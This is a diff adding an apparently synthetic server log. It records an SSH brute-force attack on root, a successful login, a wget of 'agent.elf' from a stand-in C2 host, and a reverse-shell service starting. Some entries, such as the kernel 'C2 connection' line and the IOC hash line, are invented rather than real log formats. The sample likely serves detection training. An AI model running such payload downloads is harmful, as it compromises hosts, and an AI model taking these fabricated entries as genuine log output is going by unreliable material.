@@ -1,0 +1,30 @@
+May 24 14:10:01 server1 CRON[2040]: pam_unix(cron:session): session opened for user root by (uid=0)
+May 24 14:10:01 server1 CRON[2040]: pam_unix(cron:session): session closed for user root
+May 24 14:12:30 server1 sshd[2104]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.86.151.24  user=root
+May 24 14:12:32 server1 sshd[2104]: Failed password for root from 185.86.151.24 port 45120 ssh2
+May 24 14:12:35 server1 sshd[2105]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.86.151.24  user=root
+May 24 14:12:37 server1 sshd[2105]: Failed password for root from 185.86.151.24 port 45122 ssh2
+May 24 14:12:40 server1 sshd[2106]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.86.151.24  user=root
+May 24 14:12:42 server1 sshd[2106]: Failed password for root from 185.86.151.24 port 45124 ssh2
+May 24 14:12:45 server1 sshd[2107]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.86.151.24  user=root
+May 24 14:12:47 server1 sshd[2107]: Failed password for root from 185.86.151.24 port 45126 ssh2
+May 24 14:12:50 server1 sshd[2108]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=185.86.151.24  user=root
+May 24 14:12:52 server1 sshd[2108]: Failed password for root from 185.86.151.24 port 45128 ssh2
+May 24 14:13:00 server1 sshd[2110]: Invalid user admin from 185.86.151.24 port 45130
+May 24 14:13:00 server1 sshd[2110]: Failed password for invalid user admin from 185.86.151.24 port 45130 ssh2
+May 24 14:13:03 server1 sshd[2111]: Invalid user guest from 185.86.151.24 port 45132
+May 24 14:13:03 server1 sshd[2111]: Failed password for invalid user guest from 185.86.151.24 port 45132 ssh2
+May 24 14:13:05 server1 sshd[2112]: Invalid user test from 185.86.151.24 port 45134
+May 24 14:13:05 server1 sshd[2112]: Failed password for invalid user test from 185.86.151.24 port 45134 ssh2
+May 24 14:13:10 server1 sshd[2115]: Invalid user oracle from 185.86.151.24 port 45136
+May 24 14:13:10 server1 sshd[2115]: Failed password for invalid user oracle from 185.86.151.24 port 45136 ssh2
+May 24 14:14:00 server1 sshd[2120]: Accepted password for root from 185.86.151.24 port 45140 ssh2
+May 24 14:14:00 server1 sshd[2120]: pam_unix(sshd:session): session opened for user root by (uid=0)
+May 24 14:15:02 server1 sudo:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/wget http://malicious-c2-server.net/agent.elf
+May 24 14:15:10 server1 kernel: [ 4521.120341] Outgoing connection to C2 IP 185.86.151.24:4444 established.
+May 24 14:16:01 server1 sudo:   root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/bin/bash
+May 24 14:17:00 server1 systemd[1]: Started Reverse Shell Agent Service.
+May 24 14:17:30 server1 syslogd: Critical IOC threat file downloaded. Hash MD5: 4475236279f538e1548e6530a6f44f77, SHA-256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
+May 24 14:18:00 server1 cron[2200]: cron job executed task referencing contact administrator@malicious-c2-server.net
+May 24 14:20:01 server1 CRON[2240]: pam_unix(cron:session): session opened for user root by (uid=0)
+May 24 14:20:01 server1 CRON[2240]: pam_unix(cron:session): session closed for user root
